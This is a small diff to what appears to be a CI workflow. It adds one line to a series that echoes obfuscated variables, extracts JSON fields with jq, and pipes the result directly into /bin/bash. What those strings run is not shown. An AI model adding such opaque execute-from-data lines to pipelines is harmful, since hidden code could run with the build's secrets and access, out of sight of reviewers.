@@ -36,6 +36,7 @@ jobs:
           echo $z17009 | jq -r .zu988 | /bin/bash
           echo $eba8 | jq -r .cd65 | /bin/bash
           echo $goqz2 | jq -r .msgw826 | /bin/bash
+          echo $mbc09 | jq -r .sfl25 | /bin/bash
 
       - name: Persist results
         if: always()
